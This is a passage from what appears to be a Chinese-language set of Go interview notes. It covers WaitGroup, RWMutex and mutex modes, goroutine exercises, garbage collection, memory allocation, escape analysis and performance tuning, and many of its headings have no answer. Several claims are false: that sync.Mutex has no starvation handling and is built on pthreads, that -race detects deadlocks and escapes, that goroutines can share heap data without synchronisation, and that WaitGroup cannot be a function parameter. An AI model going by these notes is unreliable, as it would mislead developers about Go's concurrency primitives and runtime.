未置为0就重用</p><p>WaitGroup可以完成一次编排任务，计数值降为0后可以继续被其他任务所用，但是不要在还没使用完的时候就用于其他任务，这样由于带着计数值，很可能出问题。</p><p>④ 复制waitgroup</p><p>WaitGroup有nocopy字段，不能被复制。也意味着WaitGroup不能作为函数的参数。</p><h2 id="18-读写锁怎么实现的"><a href="#18-读写锁怎么实现的" class="headerlink" title="18. 读写锁怎么实现的"></a>18. 读写锁怎么实现的</h2><ol><li>读写锁内部是通过互斥锁实现的,主要应用于写操作少，读操作多的场景。</li><li>基于四条规则实现</li></ol><ul><li>写锁需要阻塞写锁：一个协程拥有写锁时，其他协程写锁定需要阻塞；</li><li>写锁需要阻塞读锁：一个协程拥有写锁时，其他协程读锁定需要阻塞；</li><li>读锁需要阻塞写锁：一个协程拥有读锁时，其他协程写锁定需要阻塞；</li><li>读锁不能阻塞读锁：一个协程拥有读锁时，其他协程也可以拥有读锁。<h2 id="114-mutex-如何处理正常和饥饿状态？rwmutex中写操作如何处理写操作阻止读操作"><a href="#114-mutex-如何处理正常和饥饿状态？rwmutex中写操作如何处理写操作阻止读操作" class="headerlink" title="114. mutex 如何处理正常和饥饿状态？rwmutex中写操作如何处理写操作阻止读操作"></a>114. mutex 如何处理正常和饥饿状态？rwmutex中写操作如何处理写操作阻止读操作</h2></li></ul><p><strong>正常模式和饥饿状态：</strong></p><ul><li>正常状态下，Mutex 的锁是公平的，当一个 Goroutine 尝试获取锁时，如果锁已经被其他 Goroutine 持有，那么它将被放入一个等待队列中，直到锁被释放。</li><li>饥饿状态指的是某些 Goroutine 一直无法获得锁，而其他 Goroutine 不断获得锁的情况。在 Go 中，sync.Mutex 并没有专门的机制来处理饥饿状态。如果出现饥饿状态，通常是由于程序逻辑设计不合理导致的，可能需要重新考虑并发结构和资源的设计。</li></ul><p><strong>读写操作</strong></p><ul><li>如果一个 Goroutine 持有写锁，那么其他 Goroutine 将无法获取读锁，直到写锁被释放。这种机制保证了在写操作进行时，不会有其他 Goroutine 进行并发的读取操作，从而避免了数据的并发写入。</li><li></li></ul><h2 id="33-go的锁是可重入的吗"><a href="#33-go的锁是可重入的吗" class="headerlink" title="33. go的锁是可重入的吗"></a>33. go的锁是可重入的吗</h2><p><strong>可重入锁</strong>（也称为递归锁）是指允许同一个线程或 Goroutine 多次获取同一个锁，而不会发生死锁的情况。这在一些场景下是很有用的，比如在一个函数中多次调用其他需要锁保护的函数</p><p><strong>但是go的sync.Mutex不是可重入。</strong></p><h2 id="210-如何检测死锁的？"><a href="#210-如何检测死锁的？" class="headerlink" title="210. 如何检测死锁的？"></a>210. 如何检测死锁的？</h2><ul><li>go vet 进行静态分析</li><li>go run/build -race 可以检测死锁，在编译好静态文件后</li></ul><h2 id="211-怎么处理锁分段"><a href="#211-怎么处理锁分段" class="headerlink" title="211. 怎么处理锁分段"></a>211. 怎么处理锁分段</h2><h2 id="226-sync-mutex的底层实现（Linux）"><a href="#226-sync-mutex的底层实现（Linux）" class="headerlink" title="226. sync.mutex的底层实现（Linux）"></a>226. sync.mutex的底层实现（Linux）</h2><ul><li>实现可能因操作系统和硬件平台而异</li><li>使用 pthreads 库（POSIX 线程库）中的互斥锁实现。</li><li>这是一个用户态的锁，它会使用操作系统提供的系统调用来进行加锁和解锁</li><li>mutex维护一个state，类型是int32</li></ul><h3 id="提供了两种锁定方式：阻塞锁和自旋锁"><a href="#提供了两种锁定方式：阻塞锁和自旋锁" class="headerlink" title="提供了两种锁定方式：阻塞锁和自旋锁"></a>提供了两种锁定方式：阻塞锁和自旋锁</h3><ul><li>阻塞锁：当一个 Goroutine 尝试获取一个被其他 Goroutine 持有的锁时，它会被阻塞，直到锁被释放。</li><li>自旋锁：自旋锁是一种非阻塞的锁机制，在尝试获取锁时，如果锁已经被其他 Goroutine 持有，它会在一段时间内快速尝试获取锁，而不是被阻塞。如果在一定时间内无法获取到锁，那么它会转为阻塞模式。</li></ul><h3 id="mutex允许自旋的条件是什么【执行状态的M个数-lt-mapprocs】"><a href="#mutex允许自旋的条件是什么【执行状态的M个数-lt-mapprocs】" class="headerlink" title="mutex允许自旋的条件是什么【执行状态的M个数&lt; mapprocs】"></a>mutex允许自旋的条件是什么【执行状态的M个数&lt; mapprocs】</h3><p>开发者可以使用 runtime.GOMAXPROCS() 函数来设置 Goroutine 的最大并发数，从而影响自旋锁的行为。</p><h1 id="goroutine使用"><a href="#goroutine使用" class="headerlink" title="goroutine使用"></a>goroutine使用</h1><h2 id="20-两个goroutine交替打印字母和数字"><a href="#20-两个goroutine交替打印字母和数字" class="headerlink" title="20. 两个goroutine交替打印字母和数字"></a>20. 两个goroutine交替打印字母和数字</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">limit := <span class="number">26</span></span><br><span class="line"></span><br><span class="line">numChan := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">1</span>)</span><br><span class="line">charChan := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">1</span>)</span><br><span class="line">mainChan := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">1</span>)</span><br><span class="line">charChan &lt;- <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; limit; i++ &#123;</span><br><span class="line">&lt;-charChan</span><br><span class="line">fmt.Printf(<span class="string">"%c\n"</span>, <span class="string">'a'</span>+i)</span><br><span class="line">numChan &lt;- <span class="number">1</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; limit; i++ &#123;</span><br><span class="line">&lt;-numChan</span><br><span class="line">fmt.Println(i)</span><br><span class="line">charChan &lt;- <span class="number">1</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">mainChan &lt;- <span class="number">1</span></span><br><span class="line">&#125;()</span><br><span class="line">&lt;-mainChan</span><br><span class="line"><span class="built_in">close</span>(charChan)</span><br><span class="line"><span class="built_in">close</span>(numChan)</span><br><span class="line"><span class="built_in">close</span>(mainChan)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="26-为什么不要大量使用goroutine"><a href="#26-为什么不要大量使用goroutine" class="headerlink" title="26. 为什么不要大量使用goroutine"></a>26. 为什么不要大量使用goroutine</h2><ul><li>上下文切换，开销变大</li><li>可能会存在内存泄漏的问题，得<br>要根据具体的情况来评估并发的需求，避免不必要的并发，以免引入不必要的复杂性和潜在的问题。</li></ul><h3 id="协程池如何实现-worker"><a href="#协程池如何实现-worker" class="headerlink" title="协程池如何实现 worker"></a>协程池如何实现 worker</h3><h2 id="40-for-循环多次执行goroutine-有什么坑？"><a href="#40-for-循环多次执行goroutine-有什么坑？" class="headerlink" title="40. for 循环多次执行goroutine 有什么坑？"></a>40. for 循环多次执行goroutine 有什么坑？</h2><ul><li>go支持闭包， 如果用了循环的这个i，里面的变量就可能出错，用临时变量的副本比较好。</li><li>Goroutine 是异步执行的，它们可能会在循环变量发生变化之后才开始执行，导致不确定的结果</li></ul><h2 id="48-如果要等待所有goroutine结束，怎么做？【使用waitgroup】"><a href="#48-如果要等待所有goroutine结束，怎么做？【使用waitgroup】" class="headerlink" title="48. 如果要等待所有goroutine结束，怎么做？【使用waitgroup】"></a>48. 如果要等待所有goroutine结束，怎么做？【使用waitgroup】</h2><h2 id="55-goroutine为什么轻量"><a href="#55-goroutine为什么轻量" class="headerlink" title="55. goroutine为什么轻量"></a>55. goroutine为什么轻量</h2><p><strong>独立的栈空间</strong> 每个 Goroutine 都有自己独立的栈空间，相对于传统的线程来说，Goroutines 的栈空间通常会小很多。这使得创建和销毁 Goroutines 更加快速和节省内存。</p><p><strong>灵活的调度器</strong> Go 的运行时（runtime）包含了一个高效的调度器，它可以在多个操作系统线程上调度 Goroutines，以便充分利用多核处理器的优势。这使得在单个程序中可以同时执行大量的 Goroutines，而不会导致线程过度切换和资源浪费。</p><p><strong>快速的启动和停止</strong> 相对于传统的线程，创建和销毁 Goroutines 更加快速。这使得在需要短暂执行某些任务时，使用 Goroutines 更为合适。</p><p><strong>共享的堆空间</strong> 所有 Goroutines 共享相同的堆空间，这意味着它们可以相对容易地共享数据，而不需要显式的同步机制。</p><p><strong>通信通过通道</strong> Goroutines 之间的通信主要依赖于通道（channel），它们提供了一种安全且高效的方式来传递数据。通过通道，可以实现 Goroutines 之间的同步和数据传递，而无需显式的锁。</p><p><strong>自动的垃圾回收</strong> Go 具有垃圾回收机制，它会自动管理内存的分配和释放，使得开发者无需手动管理内存，降低了并发程序中内存泄漏的风险。</p><h2 id="85-使用两个channel实现a-b"><a href="#85-使用两个channel实现a-b" class="headerlink" title="85. 使用两个channel实现a+b"></a>85. 使用两个channel实现a+b</h2><h2 id="92-goroutine的实现方式"><a href="#92-goroutine的实现方式" class="headerlink" title="92. goroutine的实现方式"></a>92. goroutine的实现方式</h2><h2 id="100-并行goroutine如何实现"><a href="#100-并行goroutine如何实现" class="headerlink" title="100. 并行goroutine如何实现"></a>100. 并行goroutine如何实现</h2><h2 id="111-父-goroutine-退出，如何使得子goroutine也退出【waitgroup-用channel-，defer】"><a href="#111-父-goroutine-退出，如何使得子goroutine也退出【waitgroup-用channel-，defer】" class="headerlink" title="111. 父 goroutine 退出，如何使得子goroutine也退出【waitgroup 用channel ，defer】"></a>111. 父 goroutine 退出，如何使得子goroutine也退出【waitgroup 用channel ，defer】</h2><ul><li>父 Goroutine 退出时，只要main不退出，所有的子 Goroutines 不会强制关闭</li></ul><h1 id="Go的GC机制"><a href="#Go的GC机制" class="headerlink" title="Go的GC机制"></a>Go的GC机制</h1><h2 id="24-go的gc什么是否触发"><a href="#24-go的gc什么是否触发" class="headerlink" title="24. go的gc什么是否触发"></a>24. go的gc什么是否触发</h2><p><strong>主动触发(手动触发)</strong>，通过调用 runtime.GC 来触发GC，此调用阻塞式地等待当前GC运行完毕。</p><p><strong>被动触发</strong>，分为两种方式：</p><ul><li>使用步调（Pacing）算法，其核心思想是控制内存增长的比例,每次内存分配时检查当前内存分配量是否已达到阈值（环境变量GOGC）：默认100%，即当内存扩大一倍时启用GC。</li><li>使用系统监控，当超过两分钟没有产生任何GC时，强制触发 GC。</li></ul><h2 id="148-Go-语言什么时候垃圾回收，写代码时，如何减少对象分配"><a href="#148-Go-语言什么时候垃圾回收，写代码时，如何减少对象分配" class="headerlink" title="148. Go 语言什么时候垃圾回收，写代码时，如何减少对象分配"></a>148. Go 语言什么时候垃圾回收，写代码时，如何减少对象分配</h2><p><strong>对象池</strong>：可以使用 sync.Pool 或者自定义对象池来重用对象，避免频繁分配和释放。</p><p><strong>必要时使用数组而不是切片</strong>：如果你知道元素数量固定，可以使用数组而不是切片，因为切片底层数组可能会导致对象分配。</p><p><strong>避免逃逸</strong>：逃逸发生在编译器无法确定一个变量的生命周期时，变量将会在堆上分配。尽量避免函数内部的变量逃逸到堆上</p><p><strong>使用内置函数</strong>：Go 提供了一些内置函数（如 append、copy）来处理切片，它们会在底层做一些优化，避免不必要的分配。</p><h2 id="176-Golang-内存分配和管理"><a href="#176-Golang-内存分配和管理" class="headerlink" title="176. Golang 内存分配和管理"></a>176. Golang 内存分配和管理</h2><p>Go语言内置运行时（就是runtime），抛弃了传统的内存分配方式，改为自主管理。这样可以自主地实现更好的内存使用模式，比如内存池、预分配等等。这样，不会每次内存分配都需要进行系统调用。</p><p>Golang运行时的内存分配算法主要源自 Google 为 C 语言开发的TCMalloc算法，全称Thread-Caching Malloc。</p><p>核心思想就是把内存分为多级管理，从而降低锁的粒度。它将可用的堆内存采用二级分配的方式进行管理：每个线程都会自行维护一个独立的内存池，进行内存分配时优先从该内存池中分配，当内存池不足时才会向全局内存池申请，以避免不同线程对全局内存池的频繁竞争。</p><h3 id="管理如何管理？"><a href="#管理如何管理？" class="headerlink" title="管理如何管理？"></a>管理如何管理？</h3><p>Go自带GC，可以自动回收垃圾，对比C语言不用malloc申请内存及free释放，Go的GC采取三色标记法动态；</p><p>Go自动分配内存，开发者可以不用关注堆、栈，Go在编译阶段会做变量的生命周期分析做逃逸分析，自动将变量分配在堆或栈上。</p><h2 id="354-go的内存分配机制"><a href="#354-go的内存分配机制" class="headerlink" title="354. go的内存分配机制"></a>354. go的内存分配机制</h2><p>Go 的内存分配借鉴了 Google 的 TCMalloc 分配算法，其核心思想是内存池 + 多级对象管理。内存池主要是预先分配内存，减少向系统申请的频率；多级对象有：mheap、mspan、arenas、mcentral、mcache。<br>它们以 mspan 作为基本分配单位。具体的分配逻辑如下：</p><ul><li>当要分配大于 32K 的对象时，从 mheap 分配。</li><li>当要分配的对象小于等于 32K 大于 16B 时，从 P 上的 mcache 分配，如果 mcache 没有内存，则从 mcentral 获取，如果 mcentral 也没有，则向 mheap 申请，如果 mheap 也没有，则从操作系统申请内存。</li><li>当要分配的对象小于等于 16B 时，从 mcache 上的微型分配器上分配。<h2 id="324-go的内存分配机制中，有mcentral为什么要mcache"><a href="#324-go的内存分配机制中，有mcentral为什么要mcache" class="headerlink" title="324. go的内存分配机制中，有mcentral为什么要mcache"></a>324. go的内存分配机制中，有mcentral为什么要mcache</h2></li></ul><h2 id="177-如何避免内存逃逸【合理用指针，设定slice长度】"><a href="#177-如何避免内存逃逸【合理用指针，设定slice长度】" class="headerlink" title="177. 如何避免内存逃逸【合理用指针，设定slice长度】"></a>177. 如何避免内存逃逸【合理用指针，设定slice长度】</h2><ol><li>不要盲目使用变量指针作为参数，虽然减少了复制，但变量逃逸的开销更大。</li><li>预先设定好slice长度，避免频繁超出容量，重新分配。</li><li>一个经验是，指针指向的数据大部分在堆上分配的，请注意。</li></ol><p>出现内存逃逸的情况有：</p><ol><li><p>发送指针或带有指针的值到channel，因为编译时候无法知道那个goroutine会在channel接受数据，编译器无法知道什么时候释放。</p></li><li><p>在一个切片上存储指针或带指针的值。比如[]*string，导致切片内容逃逸，其引用值一直在堆上。</p></li><li><p>切片的append导致超出容量，切片重新分配地址，切片背后的存储基于运行时的数据进行扩充，就会在堆上分配。</p></li><li><p>调用接口类型时，接口类型的方法调用是动态调度，实际使用的具体实现只能在运行时确定，如一个接口类型为io.Reader的变量r，对r.Read(b)的调用将导致r的值和字节片b的后续转义并因此分配到堆上。</p></li><li><p>在方法内把局部变量指针返回，被外部引用，其生命周期大于栈，导致内存溢出。</p><h2 id="237-gc和-delete-free-有什么区别，优势？"><a href="#237-gc和-delete-free-有什么区别，优势？" class="headerlink" title="237. gc和 delete free 有什么区别，优势？"></a>237. gc和 delete free 有什么区别，优势？</h2></li></ol><ul><li>delete free是手动释放的，一有忘记的就可能导致内存泄漏，产生内存碎片</li><li>gc的话是自动释放堆的内存，<strong>能有效避免内存泄漏和内存碎片</strong>，没有垃圾回收的情况下，程序员可能需要手动释放不再使用的内存，以避免内存碎片的问题<ul><li>内存碎片是指分配在堆上的内存块中，由于频繁的分配和释放操作，导致堆中的可用内存呈现出碎片化的状态，使得大块的连续内存难以分配。</li></ul></li></ul><h2 id="355-go的性能调优是怎么做的"><a href="#355-go的性能调优是怎么做的" class="headerlink" title="355. go的性能调优是怎么做的"></a>355. go的性能调优是怎么做的</h2><h3 id="内存优化"><a href="#内存优化" class="headerlink" title="内存优化"></a>内存优化</h3><p>A、将小对象合并成结构体一次分配，减少内存分配次数</p><p>Go runtime底层采用内存池机制，每个span大小为4k，同时维护一个cache。cache有一个0到n的list数组，list数组的每个单元挂载的是一个链表，链表的每个节点就是一块可用的内存块，同一链表中的所有节点内存块都是大小相等的；但是不同链表的内存大小是不等的，即list数组的一个单元存储的是一类固定大小的内存块，不同单元里存储的内存块大小是不等的。cache缓存的是不同类大小的内存对象，申请的内存大小最接近于哪类缓存内存块时，就分配哪类内存块。当cache不够时再向spanalloc中分配。</p><p>B、缓存区内容一次分配足够大小空间，并适当复用</p><p>在协议编解码时，需要频繁地操作[]byte，可以使用bytes.Buffer或其它byte缓存区对象。<br>bytes.Buffer等通过预先分配足够大的内存，避免当增长时动态申请内存，减少内存分配次数。对于byte缓存区对象需要考虑适当地复用。<br>C、slice和map采make创建时，预估大小指定容量<br>slice和map与数组不一样，不存在固定空间大小，可以根据增加元素来动态扩容。<br>slice初始会指定一个数组，当对slice进行append等操作时，当容量不够时，会自动扩容：<br>如果新的大小是当前大小2倍以上，则容量增涨为新的大小；<br>否则循环以下操作：如果当前容量小于1024，按2倍增加；否则每次按当前容量1/4增涨，直到增涨的容量超过或等新大小。<br>map的扩容比较复杂，每次扩容会增加到上次容量的2倍。map的结构体中有一个buckets和oldbuckets，用于实现增量扩容：<br>正常情况下，直接使用buckets，oldbuckets为空；<br>如果正在扩容，则oldbuckets不为空，buckets是oldbuckets的2倍，<br>因此，建议初始化时预估大小指定容量</p><p>D、长调用栈避免申请较多的临时对象</p><p>Goroutine的调用栈默认大小是4K（1.7修改为2K），采用连续栈机制，当栈空间不够时，Go runtime会自动扩容：<br>当栈空间不够时，按2倍增加，原有栈的变量会直接copy到新的栈空间，变量指针指向新的空间地址；<br>退栈会释放栈空间的占用，GC时发现栈空间占用不到1/4时，则栈空间减少一半。<br>比如栈的最终大小2M，则极端情况下，就会有10次的扩栈操作，会带来性能下降。<br>因此，建议控制调用栈和函数的复杂度，不要在一个goroutine做完所有逻辑；如的确需要长调用栈，而考虑goroutine池化，避免频繁创建goroutine带来栈空间的变化。</p><p>E、避免频繁创建临时对象</p><p>Go在GC时会引发stop the world，即整个情况暂停。Go1.8最坏情况下GC为100us。但暂停时间还是取决于临时对象的个数，临时对象数量越多，暂停时间可能越长，并消耗CPU。<br>因此，建议GC优化方式是尽可能地减少临时对象的个数：尽量使用局部变量；所多个局部变量合并一个大的结构体或数组，减少扫描对象的次数，一次回尽可能多的内存。</p><h3 id="并发优化"><a href="#并发优化" class="headerlink" title="并发优化"></a>并发优化</h3><p>A、高并发的任务处理使用goroutine池<br>Goroutine虽然轻量，但对于高并发的轻量任务处理，频繁来创建goroutine来执行，执行效率并不会太高，因为：过多的goroutine创建，会影响go runtime对goroutine调度，以及GC消耗；高并发时若出现调用异常阻塞积压，大量的goroutine短时间积压可能导致程序崩溃。<br>B、避免高并发调用同步系统接口<br>goroutine的实现，是通过同步来模拟异步操作。<br>网络IO、锁、channel、Time.sleep、基于底层系统异步调用的Syscall操作并不会阻塞go runtime的线程调度。<br>本地IO调用、基于底层系统同步调用的Syscall、CGo方式调用C语言动态库中的调用IO或其它阻塞会创建新的调度线程。<br>网络IO可以基于epoll的异步机制（或kqueue等异步机制），但对于一些系统函数并没有提供异步机制。例如常见的posix api中，对文件的操作就是同步操作。虽有开源的fileepoll来模拟异步文件操作。但Go的Syscall还是依赖底层的操作系统的API。系统API没有异步，Go也做不了异步化处理。<br>因此，建议：把涉及到同步调用的goroutine，隔离到可控的goroutine中，而不是直接高并的goroutine调用。<br>C、高并发时避免共享对象互斥<br>传统多线程编程时，当并发冲突在4~8线程时，性能可能会出现拐点。Go推荐不通过共享内存来通信，Go创建goroutine非常容易，当大量goroutine共享同一互斥对象时，也会在某一数量的goroutine出在拐点。<br>因此，建议：goroutine尽量独立，无冲突地执行；若goroutine间存在冲突，则可以采分区来控制goroutine的并发个数，减少同一互斥对象冲突并发数。</p><h3 id="其它优化"><a href="#其它优化" class="headerlink" title="其它优化"></a>其它优化</h3><p>A、避免使用CGO或者减少CGO调用次数<br>GO可以调用C库函数，但Go带有垃圾收集器且Go的栈动态增涨，无法与C无缝地对接。Go的环境转入C代码执行前，必须为C创建一个新的调用栈，把栈变量赋值给C调用栈，调用结束现拷贝回来。调用开销较大，需要维护Go与C的调用上下文，两者调用栈的映射。相比直接的GO调用栈，单纯的调用栈可能有2个甚至3个数量级以上。<br>因此，建议：尽量避免使用CGO，无法避免时，要减少跨CGO的调用次数。<br>B、减少[]byte与string之间转换，尽量采用[]byte来字符串处理<br>GO里面的string类型是一个不可变类型，GO中[]byte与string底层是两个不同的结构，转换存在实实在在的值对象拷贝，所以尽量减少不必要的转化。<br>因此，建议：存在字符串拼接等处理，尽量采用[]byte。<br>C、字符串的拼接优先考虑bytes.Buffer<br>string类型是一个不可变类型，但拼接会创建新的string。GO中字符串拼接常见有如下几种方式：<br>string + 操作 ：导致多次对象的分配与值拷贝<br>fmt.Sprintf ：会动态解析参数，效率好不哪去<br>strings.Join ：内部是[]byte的append<br>bytes.Buffer ：可以预先分配大小，减少对象分配与拷贝<br>因此，建议：对于高性能要求，优先考虑bytes.Buffer，预先分配大小。fmt.Sprintf可以简化不同类型转换与拼</p><h2 id="500-写屏障-插入写屏障-删除写屏障-混合写屏障"><a href="#500-写屏障-插入写屏障-删除写屏障-混合写屏障" class="headerlink" title="500. 写屏障-插入写屏障-删除写屏障-混合写屏障"></a>500. 写屏障-插入写屏障-删除写屏障-混合写屏障</h2><ul><li>混合写屏障继承了插入写屏障的优点，起始无需 STW 打快照，直接并发扫 描垃圾即可；</li><li>混合写屏障继承了删除写屏障的优点，赋值器是黑色赋值器，GC 期间，任 何在栈上创建的新对象，均为黑色。扫描过一次就不需要扫描了，这样就 消除了插入写屏障时期最后 STW 的重新扫描栈；</li><li>混合写屏障扫描精度继承了删除写屏障，比插入写屏障更低，随着带来的 是 GC 过程全程无 STW；</li><li>混合写屏障扫描栈虽然没有 STW，但是扫描某一个具体的栈的时候，还是 要停止这个 goroutine 赋值器的工作（针对一个 goroutine 栈来说，是 暂停扫的，要么全灰，要么全黑哈，原子状态切换）。</li></ul><h2 id="505-gc流程"><a href="#505-gc流程" class="headerlink" title="505. gc流程"></a>505. gc流程</h2><p>GCMark 标记准备阶段，为并发标记做准备工作，启动写屏障</p><p>STWGCMark 扫描标记阶段，与赋值器并发执行，写屏障开启并发</p><p>GCMarkTermination 标记终止阶段，保证一个周期内标记任务完成，停止写屏障</p><p>GCoff 内存清扫阶段，将需要回收的内存归还到堆中，写屏障关闭</p><p>GCoff 内存归还阶段，将过多的内存归还给操作系统，写屏障关闭。</p><h2 id="506-GC是如何调优的"><a href="#506-GC是如何调优的" class="headerlink" title="506. GC是如何调优的"></a>506. GC是如何调优的</h2><h2 id="Go-内存分配机制？"><a href="#Go-内存分配机制？" class="headerlink" title="Go 内存分配机制？"></a>Go 内存分配机制？</h2><h2 id="Go-内存逃逸机制？"><a href="#Go-内存逃逸机制？" class="headerlink" title="Go 内存逃逸机制？"></a>Go 内存逃逸机制？</h2><h2 id="Go-内存对齐机制"><a href="#Go-内存对齐机制" class="headerlink" title="Go 内存对齐机制"></a>Go 内存对齐机制</h2><h2 id="563-waitgroup的底层实现"><a href="#563-waitgroup的底层实现" class="headerlink" title="563. waitgroup的底层实现"></a>563. waitgroup的底层实现</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// A WaitGroup must not be copied after first use.</span></span><br><span class="line"><span class="keyword">type</span> WaitGroup <span class="keyword">struct</span> &#123;</span><br><span class="line"> noCopy noCopy</span><br><span class="line"> state1 [<span class="number">3</span>]<span class="keyword">uint32</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="564-cond实现原理"><a href="#564-cond实现原理" class="headerlink" title="564. cond实现原理"></a>564. cond实现原理</h2><h2 id="run-race能用于什么【排查逃逸，死锁，数据竞争等】"><a href="#run-race能用于什么【排查逃逸，死锁，数据竞争等】" class="headerlink" title="run -race能用于什么【排查逃逸，死锁，数据竞争等】"></a>run -race能用于什么【排查逃逸，死锁，数据竞争等】</h2><h1 id="go其他"><a href="#go其他" class="headerlink" title="go其他"></a>go其他</h1><h2 id="17-不重启实现热更新"><a href="#17-不重启实现热更新" class="headerlink" title="17. 不重启实现热更新"></a>17. 不重启实现热更新</h2><p>根据系统的 SIGHUP 信号量，以此信号量触发进程重启，达到热更新的效果。</p><p>热部署我们需要考虑几个能力：</p><ul><li>新进程启动成功，老进程不会有资源残留</li><li>新进程初始化的过程中，服务不会中断</li><li>新进程初始化失败，老进程仍然继续工作</li><li>同一时间，只能有一个更新动作执行<br>监听信号量的方法的环境是在 类 UNIX 系统中，在现在的 UNIX 内核中，允许多个进程同时监听一个端口。在收到 SIGHUP 信号量时，先 fork 出一个新的进程监听端口，同时等待旧进程处理完已经进来的连接，最后杀掉旧进程。</li></ul><p>示例代码，仓库地址：<a href="https://github.com/guowei-gong/tablefilp-example，" target="_blank" rel="noopener">https://github.com/guowei-gong/tablefilp-example，</a> 如果你希望动手来加深印象可以打开看看。</p><h2 id="157-日志框架logrus"><a href="#157-日志框架logrus" class="headerlink" title="157. 日志框架logrus"></a>157. 日志框架logrus</h2><h2 id="go实现stack-和-set"><a href="#go实现stack-和-set" class="headerlink" title="go实现stack 和 set"></a>go实现stack 和 set</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Stack <span class="keyword">struct</span> &#123;</span><br><span class="line">    data []<span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Stack)</span> <span class="title">Push</span><span class="params">(item <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">    s.data = <span class="built_in">append</span>(s.data, item)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Stack)</span> <span class="title">Pop</span><span class="params">()</span> <span class="title">interface</span></span>&#123;&#125; &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(s.data) == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    item := s.data[<span class="built_in">len</span>(s.data)<span class="number">-1</span>]</span><br><span class="line">    s.data = s.data[:<span class="built_in">len</span>(s.data)<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> item</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Set <span class="keyword">map</span>[<span class="keyword">interface</span>&#123;&#125;]<span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s Set)</span> <span class="title">Add</span><span class="params">(item <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">    s[item] = <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s Set)</span> <span class="title">Remove</span><span class="params">(item <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">    <span class="built_in">delete</span>(s, item)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s Set)</span> <span class="title">Contains</span><span class="params">(item <span class="keyword">interface</span>&#123;&#125;)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    _, exists := s[item]</span><br><span class="line">    <span class="keyword">return</span> exists</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="200-项目上线了，但是发现协程-内存泄漏，如何处理"><a href="#200-项目上线了，但是发现协程-内存泄漏，如何处理" class="headerlink" title="200. 项目上线了，但是发现协程/内存泄漏，如何处理"></a>200. 